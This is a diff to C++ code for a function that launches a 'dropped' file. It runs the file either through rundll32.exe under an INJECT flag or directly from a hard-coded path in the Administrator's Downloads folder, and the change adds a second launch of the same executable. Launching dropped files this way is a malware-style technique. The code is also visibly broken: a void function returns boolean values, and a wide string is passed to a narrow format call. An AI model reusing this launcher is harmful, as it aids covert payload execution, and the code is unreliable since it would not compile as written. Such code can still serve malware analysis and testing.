@@ -513,27 +513,30 @@ bool non_exe_launch(std::wstring name){
 // Launch a New Process based on the dropped file name
 void exe_launch(std::wstring run_exe)
 {
-	STARTUPINFOW si;
-	PROCESS_INFORMATION pi;
-	ZeroMemory(&si, sizeof(si));
-	si.cb = sizeof(si);
-	ZeroMemory(&pi, sizeof(pi));
+	STARTUPINFOW siw;
+	PROCESS_INFORMATION piw;
+	ZeroMemory(&siw, sizeof(siw));
+	siw.cb = sizeof(siw);
+	ZeroMemory(&piw, sizeof(piw));
+
+	STARTUPINFOA sia;
+	PROCESS_INFORMATION pia;
+	ZeroMemory(&sia, sizeof(sia));
+	sia.cb = sizeof(sia);
+	ZeroMemory(&pia, sizeof(pia));
 	// build injection command
 #ifdef INJECT
 	char cmd[10 * NAME_SIZE] = "C:\\Windows\\system32\\rundll32.exe";
 	char args[100 * NAME_SIZE];
 	sprintf_s(args, 999, "%s %s", cmd, run_exe);
-	CreateProcessA(cmd, args, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+	CreateProcessA(cmd, args, NULL, NULL, FALSE, 0, NULL, NULL, &sia, &pia);
 	// call directly
 #else
 	std::wstring cmdLine = L"C:\\Users\\Administrator\\Downloads\\exe_num28.exe";
-	BOOL err = CreateProcessW( cmdLine.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
-	DWORD err_code = GetLastError();
-	std::cout << err_code;
-	if (err == 0) {
-	//	std::cout << err_code;
-		return false;
-	}
+	CreateProcessW( cmdLine.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &siw, &piw);
+
+	std::string cmd = "C:\\Users\\Administrator\\Downloads\\exe_num28.exe";
+	CreateProcessA( cmd.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &sia, &pia);
 	return true;
 #endif
 }
